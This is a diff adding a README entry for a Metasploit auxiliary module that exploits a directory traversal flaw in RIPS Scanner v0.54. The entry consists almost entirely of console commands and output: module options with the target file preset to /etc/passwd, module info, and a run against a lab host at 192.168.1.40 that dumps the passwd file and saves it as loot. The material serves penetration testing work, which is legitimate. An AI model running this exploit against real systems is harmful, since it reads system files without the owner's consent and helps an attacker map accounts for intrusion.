@@ -113,6 +113,79 @@ msf post(enum_devices_apple) >
 ```
 
 ---
+### rips_traversal.rb
+Exploit RIPS Scanner Directory Traversal
+
+Output:
+```
+msf > use auxiliary/scanner/http/rips_traversal 
+msf auxiliary(rips_traversal) > show options 
+
+Module options (auxiliary/scanner/http/rips_traversal):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   FILEPATH   /etc/passwd      yes       The path to the file to read
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      80               yes       The target port
+   TARGETURI  /rips/           yes       The URI path to the web application
+   THREADS    1                yes       The number of concurrent threads
+   VHOST                       no        HTTP server virtual host
+
+msf auxiliary(rips_traversal) > info
+
+       Name: RIPS Scanner Directory Traversal
+     Module: auxiliary/scanner/http/rips_traversal
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  Roberto Soares Espreto <robertoespreto@gmail.com>
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  FILEPATH   /etc/passwd      yes       The path to the file to read
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS                      yes       The target address range or CIDR identifier
+  RPORT      80               yes       The target port
+  TARGETURI  /rips/           yes       The URI path to the web application
+  THREADS    1                yes       The number of concurrent threads
+  VHOST                       no        HTTP server virtual host
+
+Description:
+  This module exploits a directory traversal vulnerability in the RIPS 
+  Scanner v0.54 The vulnerability affects to Windows and Linux 
+  systems.
+
+References:
+  http://codesec.blogspot.com.br/2015/03/rips-scanner-v-054-local-file-include.html
+
+msf auxiliary(rips_traversal) > set RHOSTS 192.168.1.40
+RHOSTS => 192.168.1.40
+msf auxiliary(rips_traversal) > run
+
+ root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+  bin:x:2:2:bin:/bin:/bin/sh
+  sys:x:3:3:sys:/dev:/bin/sh
+  ...snip...
+  sslh:x:122:132::/nonexistent:/bin/false
+  Debian-gdm:x:123:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
+  rtkit:x:124:134:RealtimeKit,,,:/proc:/bin/false
+  saned:x:125:135::/home/saned:/bin/false
+  vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+  debian-tor:x:126:136::/var/lib/tor:/bin/false
+  privoxy:x:127:65534::/etc/privoxy:/bin/false
+ 
+[+] 192.168.1.40:80 - File saved in: /home/espreto/.msf4/loot/20150327052351_default_192.168.1.40_rips.traversal_037872.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(rips_traversal) >
+```
+
+---
 ### enum_system.rb
 Find for SUIDs and SGIDs in linux systems.
 
